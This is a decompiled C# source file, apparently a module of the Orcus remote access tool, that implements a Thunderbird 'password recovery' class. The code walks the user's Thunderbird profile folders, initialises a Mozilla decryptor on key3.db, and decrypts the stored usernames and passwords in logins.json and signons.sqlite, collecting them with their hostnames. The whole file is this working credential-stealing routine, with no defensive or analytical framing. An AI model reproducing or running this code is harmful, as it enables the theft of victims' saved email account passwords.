using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web.Script.Serialization;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Mozilla;

internal class Thunderbird : IPasswordRecovery
{
	private const string ApplicationName = "Mozilla Thunderbird";

	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Expected O, but got Unknown
		//IL_0238: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_0255: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Unknown result type (might be due to invalid IL or missing references)
		//IL_026a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0276: Expected O, but got Unknown
		List<RecoveredPassword> list = new List<RecoveredPassword>();
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird\\Profiles"));
		if (!directoryInfo.Exists)
		{
			return list;
		}
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		string username;
		string password;
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			if (!new FileInfo(Path.Combine(directoryInfo2.FullName, "key3.db")).Exists)
			{
				continue;
			}
			MozillaDecryptor mozillaDecryptor = new MozillaDecryptor();
			try
			{
				if (!mozillaDecryptor.Initialize(directoryInfo2.FullName))
				{
					continue;
				}
			}
			catch (Exception)
			{
				continue;
			}
			FileInfo fileInfo = new FileInfo(Path.Combine(directoryInfo2.FullName, "logins.json"));
			if (fileInfo.Exists)
			{
				try
				{
					LoginData[] logins = new JavaScriptSerializer().Deserialize<FirefoxLogins>(File.ReadAllText(fileInfo.FullName)).logins;
					foreach (LoginData loginData in logins)
					{
						string username2 = mozillaDecryptor.DecryptString(loginData.encryptedUsername);
						string password2 = mozillaDecryptor.DecryptString(loginData.encryptedPassword);
						if (!list.Any((RecoveredPassword x) => x.get_UserName() == username2 && x.get_Password() == password2))
						{
							RecoveredPassword val = new RecoveredPassword();
							val.set_Application("Mozilla Thunderbird");
							val.set_UserName(username2);
							val.set_Password(password2);
							val.set_Field1(loginData.hostname);
							val.set_PasswordType((PasswordType)3);
							list.Add(val);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			FileInfo fileInfo2 = new FileInfo(Path.Combine(directoryInfo2.FullName, "signons.sqlite"));
			if (!fileInfo2.Exists)
			{
				continue;
			}
			try
			{
				SQLiteHandler sQLiteHandler = new SQLiteHandler(fileInfo2.FullName);
				if (!sQLiteHandler.ReadTable("moz_logins"))
				{
					continue;
				}
				int rowCount = sQLiteHandler.GetRowCount();
				for (int k = 0; k < rowCount; k++)
				{
					try
					{
						string value = sQLiteHandler.GetValue(k, "encryptedUsername");
						string value2 = sQLiteHandler.GetValue(k, "encryptedPassword");
						string value3 = sQLiteHandler.GetValue(k, "hostname");
						username = mozillaDecryptor.DecryptString(value);
						password = mozillaDecryptor.DecryptString(value2);
						if (!list.Any((RecoveredPassword x) => x.get_UserName() == username && x.get_Password() == password))
						{
							RecoveredPassword val2 = new RecoveredPassword();
							val2.set_Application("Mozilla Thunderbird");
							val2.set_UserName(username);
							val2.set_Password(password);
							val2.set_Field1(value3);
							val2.set_PasswordType((PasswordType)3);
							list.Add(val2);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}
}
